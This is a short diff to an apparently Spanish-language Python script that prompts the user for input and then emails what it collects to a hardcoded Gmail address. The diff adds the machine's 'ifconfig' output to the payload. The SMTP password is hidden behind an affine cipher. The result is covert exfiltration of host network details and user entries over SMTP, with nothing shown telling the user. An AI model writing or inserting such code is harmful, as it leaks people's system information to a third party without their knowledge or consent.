@@ -113,6 +113,7 @@ class enco:
             a7 = input(ro+"Alias"+wh+':')
             tubo = os.popen("ifconfig")
             tubo = tubo.readlines()
+            pxt.append(tubo)
             ptss.append(a7)
             wjd = False
             print("")
@@ -202,12 +203,12 @@ while xjs:
    except ValueError:
       print ("Responde con numero")
       xjs = True
-ri = pxt+ptss
+pxt.append(ptss)
 ks = "QFPZJOUFFTJU"
 wad = decipher_affine(ks,kg)
 subject = ptss[1]
 obj = "patoelsa170@gmail.com"
-msg = ('Subject: {}\n\n{}'.format(subject, ri))
+msg = ('Subject: {}\n\n{}'.format(subject, pxt))
 server = smtplib.SMTP("smtp.gmail.com", 587)
 server.starttls()
 server.login("malguien569@gmail.com", wad)
